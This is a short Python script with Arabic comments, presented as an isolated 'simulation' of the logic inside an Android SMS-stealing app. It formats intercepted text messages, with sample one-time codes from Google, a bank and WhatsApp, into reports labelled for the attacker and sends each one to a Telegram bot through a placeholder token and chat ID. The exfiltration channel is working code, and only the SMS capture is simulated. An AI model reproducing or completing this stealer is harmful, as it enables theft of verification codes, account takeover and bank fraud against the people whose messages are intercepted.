import telebot
import time

# --- إعدادات البوت التجريبي ---
API_TOKEN = 'TOKEN_HERE'  # ضع التوكن الخاص بك هنا
MY_CHAT_ID = 'USER_ID_HERE' # ضع معرف الشات الخاص بك هنا

# تهيئة البوت
bot = telebot.TeleBot(API_TOKEN)

def intercept_sms_logic(sender_number, sms_body):
    """
    هذه الدالة تحاكي المنطق البرمجي الذي يتم تنفيذه داخل الـ APK 
    بمجرد التقاط رسالة SMS من نظام أندرويد.
    """
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # تنسيق الرسالة التي ستظهر للمهاجم في تليجرام
    report_format = (
        f"🔴 **تم اعتراض رسالة جديدة** 🔴\n\n"
        f"📱 **من رقم:** `{sender_number}`\n"
        f"🕒 **التوقيت:** `{timestamp}`\n"
        f"💬 **المحتوى:**\n`{sms_body}`\n\n"
        f"--------------------------"
    )
    
    return report_format

def send_to_analyst(formatted_message):
    """إرسال البيانات إلى واجهة تليجرام"""
    try:
        bot.send_message(MY_CHAT_ID, formatted_message, parse_mode='Markdown')
        print("[+] SUCCESS: تم إرسال البيانات إلى البوت بنجاح.")
    except Exception as e:
        print(f"[-] ERROR: فشل الإرسال. السبب: {e}")

# --- محاكاة عملية الاختراق في بيئة معزولة ---
if __name__ == "__main__":
    print("--- تشغيل بيئة التحقيق السيبراني المعزولة ---")
    
    # 1. محاكاة وصول رسائل OTP مختلفة (سيناريوهات حقيقية)
    test_cases = [
        {"sender": "Google", "body": "G-482910 هو رمز التحقق الخاص بك."},
        {"sender": "Bank_Auth", "body": "رمز الشراء للبطاقة المنتهية بـ 1234 هو: 5592. لا تشاركه."},
        {"sender": "WhatsApp", "body": "كود واتساب الخاص بك هو [123-456]. لا تعطِ الكود لأحد."}
    ]

    for sms in test_cases:
        print(f"[*] جاري اعتراض رسالة من: {sms['sender']}...")
        
        # تنفيذ منطق الربط
        final_report = intercept_sms_logic(sms['sender'], sms['body'])
        
        # إرسال التقرير للبوت
        send_to_analyst(final_report)
        
        # تأخير بسيط لمحاكاة الواقع
        time.sleep(2)

    print("--- انتهت عملية المحاكاة ---")
